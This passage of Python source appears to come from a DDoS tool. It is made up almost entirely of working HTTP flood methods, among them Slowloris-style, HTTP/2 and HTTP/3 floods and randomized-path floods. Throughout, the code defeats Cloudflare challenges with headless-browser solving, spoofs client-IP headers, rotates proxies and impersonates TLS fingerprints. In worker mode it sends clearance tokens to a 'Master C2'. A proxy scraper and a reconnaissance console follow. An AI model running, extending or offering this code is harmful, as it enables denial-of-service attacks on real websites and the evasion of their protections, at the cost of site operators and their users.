                    cookie, ua = await asyncio.to_thread(BrowserEngine.solve_cf, str(self._target), proxy=proxy_str, user_agent=ua_target)
                    
                    used_proxy = proxy_str
                    if not cookie and proxy_str:
                        logger.warning(f"{bcolors.WARNING}[!] CFBUAM: Solve failed with proxy. Retrying without proxy...{bcolors.RESET}")
                        await HttpFlood._circuit_breaker.register_failure(proxy_str)
                        used_proxy = None
                        cookie, ua = await asyncio.to_thread(BrowserEngine.solve_cf, str(self._target), user_agent=ua_target)

                    if cookie == "proxy_error":
                        if proxy_str:
                            await HttpFlood._circuit_breaker.register_failure(proxy_str)
                        HttpFlood._cfbuam_cookie = None
                        HttpFlood._last_solve_attempt = 0
                        return
                    elif cookie:
                        if used_proxy:
                            await HttpFlood._circuit_breaker.register_success(used_proxy)
                        HttpFlood._cfbuam_cookie = cookie
                        if ua: HttpFlood._cfbuam_ua = ua
                        HttpFlood._cfbuam_proxy = used_proxy
                        HttpFlood._cfbuam_expiry = now + 900 # 15 mins
                    else:
                        HttpFlood._cfbuam_cookie = "_yummy=choco" # Fallback
                        HttpFlood._cfbuam_expiry = now + 60    # Retry sooner if failed

        ua_bytes = (HttpFlood._cfbuam_ua or randchoice(self._useragents)).encode()
        cookie_bytes = f"Cookie: {HttpFlood._cfbuam_cookie}\r\n".encode()
        spoof = ProxyTools.Random.rand_ipv4().encode()
        ref = (randchoice(self._referers) + parse.quote(self._target.human_repr())).encode()

        req = b"".join([
            self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
            b"Host: ", self._host_bytes, b"\r\n",
            cookie_bytes,
            b"Connection: ", self._conn_type_bytes, b"\r\n",
            b"User-Agent: ", ua_bytes, b"\r\n",
            b"Referer: ", ref, b"\r\n",
            self._fp_headers_bytes,
            b"X-Forwarded-For: ", spoof, b"\r\n",
            b"Client-IP: ", spoof, b"\r\n",
            b"Real-IP: ", spoof, b"\r\n",
            b"\r\n"
        ])
        
        # Broadcast bypass tokens to Master C2 if in worker mode and connected
        if "--session-id" in sys.argv and HttpFlood._cfbuam_cookie and "cf_clearance" in HttpFlood._cfbuam_cookie and HttpFlood._cfbuam_cookie != "_yummy=choco":
            import json
            print(f"__SYNC_BYPASS__||{json.dumps({'cookie': HttpFlood._cfbuam_cookie, 'ua': HttpFlood._cfbuam_ua})}")

        try:
            if CURL_CFFI_INSTALLED:
                from curl_cffi.requests import AsyncSession
                ua = HttpFlood._cfbuam_ua or randchoice(self._useragents)
                headers = {
                    "User-Agent": ua,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1"
                }
                if HttpFlood._cfbuam_cookie:
                    headers["Cookie"] = HttpFlood._cfbuam_cookie

                if HttpFlood._cfbuam_cookie and HttpFlood._cfbuam_proxy:
                    # IP-lock bypass: force the solver proxy for the flood loop
                    px = f"http://{HttpFlood._cfbuam_proxy}" if "://" not in HttpFlood._cfbuam_proxy else HttpFlood._cfbuam_proxy
                    proxies = {"http": px, "https": px}
                    pro = None
                else:
                    pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
                    proxies = {"http": pro.asRequest()["http"], "https": pro.asRequest()["https"]} if pro else None
                
                profile = BrowserEngine.get_curl_profile(ua)
                async with AsyncSession(impersonate=profile, proxies=proxies, verify=False) as s:
                    for _ in range(self._rpc):
                        for attempt in range(3):
                            try:
                                res = await s.get(self._target.human_repr(), headers=headers, timeout=15)
                                
                                global REQUESTS_SENT, BYTES_SEND, SUCCESS_SENT, WAF_SENT, ERROR_SENT
                                REQUESTS_SENT += 1
                                BYTES_SEND += len(res.content)
                                
                                code = str(res.status_code)
                                
                                # --- Diagnostic Telemetry: Headless Visibility ---
                                if "--debug" in argv or "--adaptive" in argv:
                                    try:
                                        import re
                                        raw_html = res.text[:2000]
                                        title_match = re.search(r'<title>(.*?)</title>', raw_html, re.IGNORECASE)
                                        page_title = title_match.group(1).strip() if title_match else "N/A"
                                        cookies_dict = dict(res.cookies)
                                        logger.debug(f"{bcolors.OKCYAN}[*] CFBUAM Probe | Target: {self._target.host} | Status: {code} | Title: '{page_title[:40]}' | Cookies: {list(cookies_dict.keys())[:3]}{bcolors.RESET}")
                                        if code.startswith('4') and "Just a moment" in page_title:
                                            logger.debug(f"{bcolors.WARNING}  [!] CFBUAM: Hit Cloudflare Challenge overlay! Token might be stale.{bcolors.RESET}")
                                    except Exception as e:
                                        import traceback
                                        logger.debug(f"{bcolors.FAIL}  [!] CFBUAM Telemetry Error: {str(e)[:50]}\n{traceback.format_exc()}{bcolors.RESET}")
                                # ---------------------------------------------------

                                if code.startswith(('2', '3')): SUCCESS_SENT += 1
                                elif code.startswith('4'): WAF_SENT += 1
                                elif code.startswith('5'): ERROR_SENT += 1
                                await asyncio.sleep(0)
                                break # success
                            except Exception as e:
                                if attempt == 2:
                                    if "--debug" in argv: logger.debug(f"{bcolors.FAIL}[*] CFBUAM Exception Stack: {type(e).__name__} - {e}{bcolors.RESET}")
                                    global TIMEOUT_SENT
                                    TIMEOUT_SENT += 1
                                    if pro and self._proxy_pool:
                                        self._proxy_pool.report_failure(pro)
                                    elif not pro and HttpFlood._cfbuam_proxy:
                                        HttpFlood._cfbuam_proxy_fails += 1
                                        if HttpFlood._cfbuam_proxy_fails > max(50, self._rpc):
                                            logger.debug(f"{bcolors.WARNING}[!] CFBUAM Solver Proxy degraded. Forcing re-solve...{bcolors.RESET}")
                                            HttpFlood._cfbuam_cookie = None
                                            HttpFlood._cfbuam_proxy_fails = 0
                                else:
                                    await asyncio.sleep(0.5 * (2 ** attempt))
            else:
                for attempt in range(3):
                    try:
                        reader, writer = await self.open_connection()
                        async with writer:
                            for _ in range(self._rpc):
                                await self._send_async(writer, req, reader)
                                await asyncio.sleep(0)
                        break
                    except Exception as e:
                        if attempt == 2:
                            logger.debug(f"[*] CFBUAM Socket Exception: {e}")
                            TIMEOUT_SENT += 1
                        else:
                            await asyncio.sleep(0.5 * (2 ** attempt))
        except Exception as e:
            logger.debug(f"[*] CFBUAM Outer Exception: {e}")
            TIMEOUT_SENT += 1

    async def AVB(self) -> None:
        payload = self.generate_payload()
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await asyncio.sleep(max(self._rpc / 1000, 0.1))
                    await self._send_async(writer, payload, reader)
        except: pass

    async def DGB(self) -> None:
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(SYNC_EXECUTOR, self._sync_DGB)

    def _sync_DGB(self):
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception):
            if self._proxy_pool:
                pro = self._proxy_pool.get_proxy()
                if pro:
                    with Tools.dgb_solver(
                        self._target.human_repr(),
                        randchoice(self._useragents),
                        pro.asRequest(),
                    ) as ss:
                        for _ in range(min(self._rpc, 5)):
                            sleep(min(self._rpc, 5) / 100)
                            with ss.get(
                                self._target.human_repr(),
                                proxies=pro.asRequest(),
                                timeout=5,
                            ) as res:
                                REQUESTS_SENT += 1
                                BYTES_SEND += Tools.sizeOfRequest(res)
                                continue
                    Tools.safe_close(ss)
                    return
            with Tools.dgb_solver(
                self._target.human_repr(), randchoice(self._useragents)
            ) as ss:
                for _ in range(min(self._rpc, 5)):
                    sleep(min(self._rpc, 5) / 100)
                    with ss.get(self._target.human_repr(), timeout=5) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
            Tools.safe_close(ss)

    async def DYN(self) -> None:
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    spoof = ProxyTools.Random.rand_ipv4().encode()
                    ua = randchoice(self._useragents).encode()
                    ref = (randchoice(self._referers) + parse.quote(self._target.human_repr())).encode()
                    payload = b"".join([
                        self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
                        b"Host: ", ProxyTools.Random.rand_str(6).encode(), b".", self._host_bytes, b"\r\n",
                        b"Connection: ", self._conn_type_bytes, b"\r\n",
                        b"User-Agent: ", ua, b"\r\n",
                        b"Referer: ", ref, b"\r\n",
                        self._fp_headers_bytes,
                        b"X-Forwarded-For: ", spoof, b"\r\n",
                        b"Client-IP: ", spoof, b"\r\n",
                        b"Real-IP: ", spoof, b"\r\n\r\n"
                    ])
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def DOWNLOADER(self) -> None:
        payload = self.generate_payload()
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
                    while True:
                        data = await reader.read(1024)
                        if not data:
                            break
                await self._send_async(writer, b"0")
        except: pass

    async def BYPASS(self) -> None:
        session = await AsyncHTTPManager.get_session()
        
        async def _send():
            pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
            proxy_url = pro.asRequest()["http"] if pro else None
            
            for attempt in range(3):
                try:
                    async with session.get(
                        self._target.human_repr(),
                        proxy=proxy_url,
                        timeout=5
                    ) as res:
                        content = await res.read()
                        global REQUESTS_SENT, BYTES_SEND, SUCCESS_SENT, WAF_SENT, ERROR_SENT
                        BYTES_SEND += len(content) + sum(len(k) + len(v) for k, v in res.headers.items())
                        REQUESTS_SENT += 1
                        
                        code = str(res.status)
                        if code.startswith(('2', '3')): SUCCESS_SENT += 1
                        elif code.startswith('4'): WAF_SENT += 1
                        elif code.startswith('5'): ERROR_SENT += 1
                        break
                except Exception as e:
                    if attempt == 2:
                        global TIMEOUT_SENT
                        TIMEOUT_SENT += 1
                        if pro and self._proxy_pool:
                            self._proxy_pool.report_failure(pro)
                    else:
                        await asyncio.sleep(0.5 * (2 ** attempt))

        tasks = [_send() for _ in range(self._rpc)]
        await asyncio.gather(*tasks)

    async def GSB(self) -> None:
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    spoof = ProxyTools.Random.rand_ipv4().encode()
                    ua = randchoice(self._useragents).encode()
                    ref = (randchoice(self._referers) + parse.quote(self._target.human_repr())).encode()
                    payload = b"".join([
                        self._method_bytes, b" ", self._path_bytes, b"?qs=", ProxyTools.Random.rand_str(6).encode(), b" HTTP/1.1\r\n",
                        b"Host: ", self._host_bytes, b"\r\n",
                        b"Connection: ", self._conn_type_bytes, b"\r\n",
                        b"User-Agent: ", ua, b"\r\n",
                        b"Referer: ", ref, b"\r\n",
                        self._fp_headers_bytes,
                        b"X-Forwarded-For: ", spoof, b"\r\n",
                        b"Client-IP: ", spoof, b"\r\n",
                        b"Real-IP: ", spoof, b"\r\n\r\n"
                    ])
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def RHEX(self) -> None:
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    spoof = ProxyTools.Random.rand_ipv4().encode()
                    ua = randchoice(self._useragents).encode()
                    ref = (randchoice(self._referers) + parse.quote(self._target.human_repr())).encode()
                    randhex = randbytes(randchoice([32, 64, 128])).hex().encode()
                    payload = b"".join([
                        self._method_bytes, b" ", self._path_bytes, b"/", randhex, b" HTTP/1.1\r\n",
                        b"Host: ", self._host_bytes, b"/", randhex, b"\r\n",
                        b"Connection: ", self._conn_type_bytes, b"\r\n",
                        b"User-Agent: ", ua, b"\r\n",
                        b"Referer: ", ref, b"\r\n",
                        self._fp_headers_bytes,
                        b"X-Forwarded-For: ", spoof, b"\r\n",
                        b"Client-IP: ", spoof, b"\r\n",
                        b"Real-IP: ", spoof, b"\r\n\r\n"
                    ])
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def STOMP(self) -> None:
        hexh = b"A" * 1024 # Optimized stomp pattern
        p1 = b"".join([
            self._method_bytes, b" ", self._path_bytes, b"/", hexh, b" HTTP/1.1\r\n",
            b"Host: ", self._host_bytes, b"\r\n\r\n"
        ])
        p2 = b"".join([
            self._method_bytes, b" ", self._path_bytes, b"/cdn-cgi/l/chk_captcha HTTP/1.1\r\n",
            b"Host: ", hexh, b"\r\n\r\n"
        ])
        try:
            reader, writer = await self.open_connection()
            async with writer:
                await self._send_async(writer, p1)
                for _ in range(self._rpc):
                    await self._send_async(writer, p2)
        except: pass

    async def NULL(self) -> None:
        payload = b"".join([
            self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
            b"Host: ", self._host_bytes, b"\r\n",
            b"User-Agent: null\r\n",
            b"Referrer: null\r\n",
            b"Connection: keep-alive\r\n\r\n"
        ])
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def BOMB(self) -> None:
        if not self._proxy_pool or len(self._proxy_pool) == 0:
            exit("This method requires proxies.")
        while True:
            proxy = self._proxy_pool.get_proxy()
            if proxy and proxy.type != ProxyType.SOCKS4:
                break
        
        try:
            # Resolve bombardier path dynamically if possible, or use fallback
            bombardier_path = Path.home() / "go/bin/bombardier"
            process = await asyncio.create_subprocess_exec(
                str(bombardier_path), 
                f"--connections={self._rpc}",
                "--http2",
                "--method=GET",
                "--latencies",
                "--timeout=30s",
                f"--requests={self._rpc}",
                f"--proxy={proxy}",
                f"{self._target.human_repr()}",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await process.communicate()
            if self._thread_id == 0 and stdout:
                print(proxy, stdout.decode(), sep="\n")
        except: pass

    async def SLOW(self) -> None:
        payload = self.generate_payload()
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
                while True:
                    await self._send_async(writer, payload, reader)
                    if not await reader.read(1):
                        break
                    for _ in range(self._rpc):
                        keep = str.encode(
                            "X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000)
                        )
                        await self._send_async(writer, keep)
                        await asyncio.sleep(self._rpc / 15)
                        break
        except: pass

    async def IMPERSONATE(self) -> None:
        """Deep TLS/JA3 Impersonation using curl-cffi."""
        if not CURL_CFFI_INSTALLED:
            logger.error("[!] curl-cffi not installed. IMPERSONATE method unavailable.")
            await asyncio.sleep(1)
            return

        from curl_cffi.requests import AsyncSession
        
        ua = HttpFlood._cfbuam_ua or randchoice(self._useragents)
        profile = BrowserEngine.get_curl_profile(ua)

        pro = self._proxy_pool.get_proxy() if self._proxy_pool else None

        proxies = {"http": pro.asRequest()["http"], "https": pro.asRequest()["https"]} if pro else None
        
        headers = {
            "User-Agent": ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
        if HttpFlood._cfbuam_cookie:
            headers["Cookie"] = HttpFlood._cfbuam_cookie

        try:
            # Parallelized RPC with tuned semaphore
            concurrency = min(max(10, self._rpc), 100)
            sem = asyncio.Semaphore(concurrency)
            async with AsyncSession(impersonate=profile, proxies=proxies, verify=False) as s:
                async def _send():
                    async with sem:
                        for attempt in range(3):
                            try:
                                # Use class-level semaphore to prevent overloading
                                async with HttpFlood._curl_cffi_sem:
                                    res = await s.get(self._target.human_repr(), headers=headers, timeout=15)
                                    global REQUESTS_SENT, BYTES_SEND, SUCCESS_SENT, WAF_SENT, ERROR_SENT
                                    REQUESTS_SENT += 1
                                    BYTES_SEND += len(res.content)
                                    
                                    code = str(res.status_code)
                                    
                                    # --- Diagnostic Telemetry: Headless Visibility ---
                                    if "--debug" in argv or "--adaptive" in argv:
                                        try:
                                            import re
                                            raw_html = res.text[:2000]
                                            title_match = re.search(r'<title>(.*?)</title>', raw_html, re.IGNORECASE)
                                            page_title = title_match.group(1).strip() if title_match else "N/A"
                                            cookies_dict = dict(res.cookies)
                                            logger.debug(f"{bcolors.OKCYAN}[*] IMPERSONATE Probe | Target: {self._target.host} | Status: {code} | Title: '{page_title[:40]}' | Cookies: {list(cookies_dict.keys())[:3]}{bcolors.RESET}")
                                            if code.startswith('4') and "Just a moment" in page_title:
                                                logger.debug(f"{bcolors.WARNING}  [!] IMPERSONATE: Hit Cloudflare Challenge overlay! Token might be stale.{bcolors.RESET}")
                                        except Exception as e:
                                            import traceback
                                            logger.debug(f"{bcolors.FAIL}  [!] IMPERSONATE Telemetry Error: {str(e)[:50]}\n{traceback.format_exc()}{bcolors.RESET}")
                                    # ---------------------------------------------------

                                    if code.startswith(('2', '3')): SUCCESS_SENT += 1
                                    elif code.startswith('4'): WAF_SENT += 1
                                    elif code.startswith('5'): ERROR_SENT += 1
                                    break # success, exit retry loop
                            except Exception as e:
                                if attempt == 2:
                                    if "--debug" in argv or "--adaptive" in argv:
                                        import traceback
                                        logger.debug(f"{bcolors.FAIL}[*] IMPERSONATE Exception Stack: {type(e).__name__} - {e}\n{traceback.format_exc()}{bcolors.RESET}")
                                    global TIMEOUT_SENT
                                    TIMEOUT_SENT += 1
                                    if pro and self._proxy_pool:
                                        self._proxy_pool.report_failure(pro)
                                else:
                                    await asyncio.sleep(0.5 * (2 ** attempt)) # 0.5s, 1.0s

                tasks = [_send() for _ in range(self._rpc)]
                await asyncio.gather(*tasks)
        except Exception:
            if pro and self._proxy_pool:
                self._proxy_pool.report_failure(pro)

    async def H2FLOOD(self) -> None:
        """HTTP/2 Multiplexing Flooding using httpx."""
        if not HTTPX_INSTALLED:
            logger.error("[!] httpx not installed. H2FLOOD method unavailable.")
            await asyncio.sleep(1)
            return

        import httpx

        pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
        proxy_url = pro.asRequest()["http"] if pro else None
        
        ua = HttpFlood._cfbuam_ua or randchoice(self._useragents)
        headers = {"User-Agent": ua}
        if HttpFlood._cfbuam_cookie:
            headers["Cookie"] = HttpFlood._cfbuam_cookie

        try:
            async with httpx.AsyncClient(http2=True, proxy=proxy_url, verify=False, follow_redirects=True) as client:
                async def _send():
                    for attempt in range(3):
                        try:
                            res = await client.get(self._target.human_repr(), headers=headers, timeout=5)
                            global REQUESTS_SENT, BYTES_SEND, SUCCESS_SENT, WAF_SENT, ERROR_SENT
                            REQUESTS_SENT += 1
                            BYTES_SEND += len(res.content)
                            
                            code = str(res.status_code)
                            if code.startswith(('2', '3')): SUCCESS_SENT += 1
                            elif code.startswith('4'): WAF_SENT += 1
                            elif code.startswith('5'): ERROR_SENT += 1
                            break
                        except Exception:
                            if attempt == 2:
                                global TIMEOUT_SENT
                                TIMEOUT_SENT += 1
                            else:
                                await asyncio.sleep(0.5 * (2 ** attempt))

                tasks = [_send() for _ in range(self._rpc)]
                await asyncio.gather(*tasks)
        except Exception:
            if pro and self._proxy_pool:
                self._proxy_pool.report_failure(pro)

    async def HTTP3(self) -> None:
        """HTTP/3 (QUIC) Flooding using httpx."""
        if not HTTPX_INSTALLED:
            logger.error("[!] httpx not installed. HTTP3 method unavailable.")
            await asyncio.sleep(1)
            return

        import httpx
        
        pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
        # Note: httpx proxy support for HTTP3 might be limited depending on the transport
        # We use a standard client but enable http3
        
        ua = HttpFlood._cfbuam_ua or randchoice(self._useragents)
        headers = {"User-Agent": ua}
        if HttpFlood._cfbuam_cookie:
            headers["Cookie"] = HttpFlood._cfbuam_cookie

        try:
            async with httpx.AsyncClient(http3=True, verify=False, follow_redirects=True) as client:
                for _ in range(self._rpc):
                    try:
                        res = await client.get(self._target.human_repr(), headers=headers, timeout=5)
                        global REQUESTS_SENT, BYTES_SEND, SUCCESS_SENT, WAF_SENT, ERROR_SENT
                        REQUESTS_SENT += 1
                        BYTES_SEND += len(res.content)
                        
                        code = str(res.status_code)
                        if code.startswith(('2', '3')): SUCCESS_SENT += 1
                        elif code.startswith('4'): WAF_SENT += 1
                        elif code.startswith('5'): ERROR_SENT += 1
                    except:
                        global TIMEOUT_SENT
                        TIMEOUT_SENT += 1
        except Exception:
            pass

    async def BROWSER(self) -> None:
        """
        Full Browser Bypass: Maintains a headless browser instance and simulates realistic behavior.
        Falls back to IMPERSONATE natively if cf_clearance token is acquired and fresh.
        """
        now = time()
        is_fresh = HttpFlood._cfbuam_cookie and HttpFlood._cfbuam_cookie != "_yummy=choco" and (HttpFlood._cfbuam_expiry - now) > 600

        if is_fresh:
            # Token is fresh, fall back to high-speed IMPERSONATE flood
            if "--debug" in argv: logger.debug(f"{bcolors.OKGREEN}[*] BROWSER: Token fresh, defaulting to IMPERSONATE...{bcolors.RESET}")
            await self.IMPERSONATE()
            return

        # If not fresh, use full browser cascade via solve_cf loop (simulating BROWSER method)
        if HttpFlood._cfbuam_lock.locked():
            await asyncio.sleep(random.uniform(1, 3))
            return
            
        async with HttpFlood._cfbuam_lock:
            if now - getattr(HttpFlood, '_last_solve_attempt', 0) > 30:
                HttpFlood._last_solve_attempt = now
                if "--debug" in argv: logger.debug(f"{bcolors.WARNING}[*] BROWSER: Initializing headless session for {self._target.host}...{bcolors.RESET}")
                proxy_str = str(self._proxy_pool.get_proxy()) if self._proxy_pool else None
                ua_target = ML_ENGINE.get_fingerprint()["ua"]
                
                try:
                    cookie, ua = await asyncio.to_thread(BrowserEngine.solve_cf, str(self._target), proxy=proxy_str, user_agent=ua_target)
                    if cookie == "proxy_error":
                        HttpFlood._cfbuam_cookie = None
                        HttpFlood._last_solve_attempt = 0
                        return
                    elif cookie:
                        HttpFlood._cfbuam_cookie = cookie
                        if ua: HttpFlood._cfbuam_ua = ua
                        HttpFlood._cfbuam_expiry = now + 900
                        if "--debug" in argv: logger.debug(f"{bcolors.OKGREEN}[*] BROWSER: Clearance ACQUIRED!{bcolors.RESET}")
                    else:
                        HttpFlood._cfbuam_cookie = "_yummy=choco"
                        HttpFlood._cfbuam_expiry = now + 60
                except Exception as e:
                    if "--debug" in argv: logger.debug(f"{bcolors.FAIL}[!] BROWSER Error: {e}{bcolors.RESET}")

        target_str = str(self._target)
        # Even after solving, do a quick impersonate test if cookied
        if HttpFlood._cfbuam_cookie and HttpFlood._cfbuam_cookie != "_yummy=choco":
            await self.IMPERSONATE()
        else:
            await asyncio.sleep(5) # Prevent spamming full browser instances unnecessarily

    async def HYBRID(self) -> None:
        """
        Adaptive Full-Fidelity Bypass:
        Oscillates between BROWSER (full CDP solving) and IMPERSONATE based on dynamic conditions.
        """
        total = HttpFlood._sample_count
        waf = HttpFlood._waf_blocks
        waf_ratio = (waf / total) if total > 0 else 0.0

        if "--debug" in sys.argv and (HttpFlood._sample_count % 100 == 0):
            logger.debug(f"{bcolors.HEADER}[~] HYBRID Telemetry | WAF Ratio: {waf_ratio:.2f} (Total: {total}){bcolors.RESET}")

        if waf_ratio > 0.4:
            # WAF actively blocking, fall back heavily to BROWSER approach
            await self.BROWSER()
        else:
            # Mostly successful, use IMPERSONATE to save CPU
            await self.IMPERSONATE()

    async def ADAPTIVE(self) -> None:
        """
        ADAPTIVE Method: Automatically detects WAF and routes to best bypass.
        """
        if "cloudflare" in str(self._target).lower() or "readtoon" in str(self._target).lower():
            if HttpFlood._active_solver or "cf_clearance" in HttpFlood._cfbuam_cookie:
                await self.IMPERSONATE()
            else:
                await self.CFBUAM()
        else:
            await self.IMPERSONATE()


class ProxyManager:
    @staticmethod
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
        providrs = [
            provider
            for provider in cf["proxy-providers"]
            if provider["type"] == Proxy_type or provider["type"] == 0 or Proxy_type == 0
        ]
        logger.info(
            f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}"
            % len(providrs)
        )
        proxes: Set[Proxy] = set()
        with ThreadPoolExecutor(len(providrs)) as executor:
            future_to_download = {
                executor.submit(
                    ProxyManager.download,
                    provider,
                    (
                        ProxyType.stringToProxyType(str(provider["type"]))
                        if provider["type"] != 0
                        else None
                    ),
                )
                for provider in providrs
            }
            for future in as_completed(future_to_download):
                for pro in future.result():
                    if Proxy_type != 0 and pro.type != ProxyType.stringToProxyType(
                        str(Proxy_type)
                    ):
                        continue  # Skip mismatched types if user requested specific protocol
                    proxes.add(pro)
        return proxes

    @staticmethod
    def download(provider, proxy_type: Optional[ProxyType]) -> Set[Proxy]:
        type_name = proxy_type.name if proxy_type else "ALL"
        url_or_path = provider["url"]
        logger.debug(
            f"{bcolors.WARNING}Proxies from (Source: {bcolors.OKBLUE}%s{bcolors.WARNING}, Type: {bcolors.OKBLUE}%s{bcolors.WARNING}){bcolors.RESET}"
            % (url_or_path, type_name)
        )
        proxes: Set[Proxy] = set()
        data = ""

        try:
            if str(url_or_path).startswith("http://") or str(url_or_path).startswith(
                "https://"
            ):
                data = get(url_or_path, timeout=provider["timeout"]).text
            else:
                p = Path(url_or_path)
                if p.exists() and p.is_file():
                    with p.open("r", encoding="utf-8", errors="ignore") as f:
                        data = f.read()
                else:
                    logger.error(f"[!] Source not found or invalid: {url_or_path}")
                    return proxes

            if proxy_type:
                for proxy in ProxyUtiles.parseAllIPPort(data.splitlines(), proxy_type):
                    proxes.add(proxy)
            else:
                for line in data.splitlines():
                    p = Proxy.fromString(line.strip())
                    if p:
                        proxes.add(p)
        except Exception as e:
            logger.error(f"Download Proxy Error: {(e.__str__() or e.__repr__())}")
        return proxes


class ToolsConsole:
    METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}

    @staticmethod
    def checkRawSocket():
        with suppress(OSError):
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
                return True
        return False

    @staticmethod
    def runConsole():
        cons = f"{gethostname()}@MHTools:~#"
        while 1:
            cmd = input(cons + " ").strip()
            if not cmd:
                continue
            if " " in cmd:
                cmd, args = cmd.split(" ", 1)
            cmd = cmd.upper()
            if cmd == "HELP":
                print("Tools:" + ", ".join(ToolsConsole.METHODS))
                print("Commands: HELP, CLEAR, BACK, EXIT")
                continue
            if {cmd} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                exit(-1)
            if cmd == "CLEAR":
                print("\033c")
                continue
            if not {cmd} & ToolsConsole.METHODS:
                print(f"{cmd} command not found")
                continue
            if cmd == "DSTAT":
                with suppress(KeyboardInterrupt):
                    ld = net_io_counters(pernic=False)
                    while True:
                        sleep(1)
                        od, ld = ld, net_io_counters(pernic=False)
                        t = [(last - now) for now, last in zip(od, ld)]
                        logger.info(
                            (
                                "Bytes Sent %s\n"
                                "Bytes Received %s\n"
                                "Packets Sent %s\n"
                                "Packets Received %s\n"
                                "ErrIn %s\n"
                                "ErrOut %s\n"
                                "DropIn %s\n"
                                "DropOut %s\n"
                                "Cpu Usage %s\n"
                                "Memory %s\n"
                            )
                            % (
                                Tools.humanbytes(t[0]),
                                Tools.humanbytes(t[1]),
                                Tools.humanformat(t[2]),
                                Tools.humanformat(t[3]),
                                t[4],
                                t[5],
                                t[6],
                                t[7],
                                str(cpu_percent()) + "%",
                                str(virtual_memory().percent) + "%",
                            )
                        )
            if cmd in ["CFIP", "DNS"]:
                print("Soon")
                continue
            if cmd == "CHECK":
                while True:
                    with suppress(Exception):
                        domain = input(f"{cons}give-me-ipaddress# ")
                        if not domain:
                            continue
                        if domain.upper() == "BACK":
                            break
                        if domain.upper() == "CLEAR":
                            print("\033c")
                            continue
                        if {domain.upper()} & {
                            "E",
                            "EXIT",
                            "Q",
                            "QUIT",
                            "LOGOUT",
                            "CLOSE",
                        }:
                            exit(-1)
                        if "/" not in domain:
                            continue
                        logger.info("please wait ...")
                        with get(domain, timeout=20) as r:
                            logger.info(
                                ("status_code: %d\nstatus: %s")
                                % (
                                    r.status_code,
                                    "ONLINE" if r.status_code <= 500 else "OFFLINE",
                                )
                            )
            if cmd == "INFO":
                while True:
                    domain = input(f"{cons}give-me-ipaddress# ")
                    if not domain:
                        continue
                    if domain.upper() == "BACK":
                        break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)
                    domain = domain.replace("https://", "").replace("http://", "")
                    if "/" in domain:
                        domain = domain.split("/")[0]
                    print("please wait ...", end="\r")
                    info = ToolsConsole.info(domain)
                    if not info["success"]:
                        print("Error!")
                        continue
                    logger.info(
                        ("Country: %s\nCity: %s\nOrg: %s\nIsp: %s\nRegion: %s\n")
                        % (
                            info["country"],
                            info["city"],
                            info["org"],
                            info["isp"],
                            info["region"],
                        )
                    )
            if cmd == "TSSRV":
                while True:
                    domain = input(f"{cons}give-me-domain# ")
                    if not domain:
                        continue
                    if domain.upper() == "BACK":
                        break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)
                    domain = domain.replace("https://", "").replace("http://", "")
                    if "/" in domain:
                        domain = domain.split("/")[0]
                    print("please wait ...", end="\r")
                    info = ToolsConsole.ts_srv(domain)
                    logger.info(f"TCP: {(info['_tsdns._tcp.'])}\n")
                    logger.info(f"UDP: {(info['_ts3._udp.'])}\n")
            if cmd == "PING":
                while True:
                    domain = input(f"{cons}give-me-ipaddress# ")
                    if not domain:
                        continue
                    if domain.upper() == "BACK":
                        break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)
                    domain = domain.replace("https://", "").replace("http://", "")
                    if "/" in domain:
                        domain = domain.split("/")[0]
                    logger.info("please wait ...")
                    r = ping(domain, count=5, interval=0.2)
                    logger.info(
